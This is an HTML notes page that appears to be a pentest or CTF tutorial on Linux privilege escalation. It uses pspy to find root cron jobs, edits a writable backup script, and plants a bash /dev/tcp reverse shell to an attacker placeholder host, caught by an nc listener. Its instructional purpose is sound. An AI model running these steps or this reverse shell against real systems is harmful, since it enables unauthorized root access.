<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Find Running Cronjobs (Pspy)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Find Running Cronjobs (Pspy)</h1><br/><br /><strong>Pspy</strong><br />We can use Pspy to see commands run by other users, cron jobs, etc in real time. It works by scanning <a href="https://en.wikipedia.org/wiki/Procfs">procfs</a><h3>.</h3><br />Github: <a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a><br />Download:<br />	<div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">wget</span> https<span style="color:#ff9d00;font-weight:700">://</span>github.com<span style="color:#ff9d00;font-weight:700">/</span>DominicBreuker<span style="color:#ff9d00;font-weight:700">/</span>pspy<span style="color:#ff9d00;font-weight:700">/</span>releases<span style="color:#ff9d00;font-weight:700">/</span>download<span style="color:#ff9d00;font-weight:700">/</span>v1.2.0<span style="color:#ff9d00;font-weight:700">/</span>pspy32<br />python3 -m http.server<br /><span style="color:#ff9d00;font-weight:700">wget</span> <span style="color:#3ad900;font-weight:400">&quot;http://10.10.15.123:8000/pspy32&quot;</span>     <span style="color:#0088ff;font-weight:400">#from the target</span><br /><span style="color:#ff9d00;font-weight:700">chmod</span> +x pspy32</pre></div><br /><br /><br />1. <strong>Execute on the target pspy</strong><br />	The -pf flag tells the tool to print commands and file system events and -i 1000 tells it to scan <a href="https://en.wikipedia.org/wiki/Procfs">profcs</a> every 1000ms (or every second).<br />	Wait some minutes waiting if some commands are running<br />	<div class="codebox"><pre>.<span style="color:#ff9d00;font-weight:700">/</span>pspy32 -pf -i 1000</pre></div><br />	<a href=""><img src="images/2615-1.png" alt="images/2615-1.png" /></a><br />	<span style="text-decoration:underline;">SEARCH FOR:</span><br />   1) commands that are running every some time<br />      We can see that every 2 minute is running “/bin/bash /dmz-backups/backup.sh”<br />   2) Commands running as UID=0 (root) or an id that is not of our user (command “id”)<br />   		<a href=""><img src="images/2615-2.png" alt="images/2615-2.png" /></a><br />	<br />2. Search for the file and its permissions<br />	<div class="codebox"><pre>ls -l [file]</pre></div><br />	<a href=""><img src="images/2615-3.png" alt="images/2615-3.png" /></a><br />	we can see that we have write permission on it!<br />	Check the content<br />	<a href=""><img src="images/2615-4.png" alt="images/2615-4.png" /></a><br /><br />3. Modify the script<br />	Add  a Bash One liner reverse shell: <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a><br />	<div class="codebox"><pre>bash -i &gt;&amp; /dev/tcp/[ATTACKER_IP]/[ATTACKER_PORT] 0&gt;&amp;1</pre></div><br />	<a href=""><img src="images/2615-5.png" alt="images/2615-5.png" /></a><br /><br />4. Set a listener on the attacker on the port chosen<br />	<div class="codebox"><pre>nc -nvlp [ATTACKER_PORT]</pre></div><br />	after some time we should have a reverse shell<br />	<a href=""><img src="images/2615-6.png" alt="images/2615-6.png" /></a></div>
</body>
</html>
